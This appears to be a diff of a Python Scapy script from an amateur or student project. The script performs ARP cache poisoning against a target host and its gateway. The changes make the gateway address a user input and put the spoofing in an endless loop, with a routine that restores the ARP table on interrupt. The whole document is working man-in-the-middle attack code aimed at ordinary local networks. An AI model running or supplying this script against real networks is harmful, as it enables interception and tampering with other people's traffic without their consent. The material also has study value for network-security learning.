@@ -1,16 +1,12 @@
 from scapy.layers.l2 import *
-from scapy.sendrecv import send, sr1
-
-var = True
+from scapy.sendrecv import send
 
 def spoofarpcache(targetip, targetmac, sourceip):
-	results, unans= sr1(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
-	print(results)
+	send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
 	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
-	results, unans = sr1(packet, verbose=False)
-	print(results)
+	send(packet, verbose=False)
 	print("ARP Table restored to normal for", targetip)
 
 def MultiSniffing():
@@ -22,18 +18,16 @@ def MultiSniffing():
 	print(ipt)
 
 
-def SingleSniffing(targetip):
+def SingleSniffing(targetip, passerelleip):
 	if str(arping(targetip)[0])[-2] != "0" :
 		targetmac = getmacbyip(conf.route.route("0.0.0.0")[1])
-		gatewayip = "10.3.2.254"  #conf.route.route(targetip)[2]
-		gatewaymac = getmacbyip(conf.route.route("10.3.2.254")[2])
+		gatewayip = passerelleip#conf.route.route(targetip)[2]
+		gatewaymac = getmacbyip(conf.route.route(passerelleip)[2])
 		try:
 			print("Sending spoofed ARP responses")
-			#while var:
-			spoofarpcache(targetip, targetmac, gatewayip)
-			print("J'en ai marre stop toi et marche ta mère la reine des chocolat")
-			spoofarpcache(gatewayip, gatewaymac, targetip)
-			print("J'en ai marre stop toi et marche ta mère la reine des caramels")
+			while True:
+				spoofarpcache(targetip, targetmac, gatewayip)
+				spoofarpcache(gatewayip, gatewaymac, targetip)
 		except KeyboardInterrupt:
 			print("ARP spoofing stopped")
 			restorearp(gatewayip, gatewaymac, targetip, getmacbyip(targetip))
@@ -42,5 +36,6 @@ def SingleSniffing(targetip):
 	else:
 		print("Ip not reachable")
 
-
-SingleSniffing(input("Which ip : "))
+iptarget = input("Which ip target :")
+ippasserelle = input("Which ip passerelle :")
+SingleSniffing(iptarget, ippasserelle)
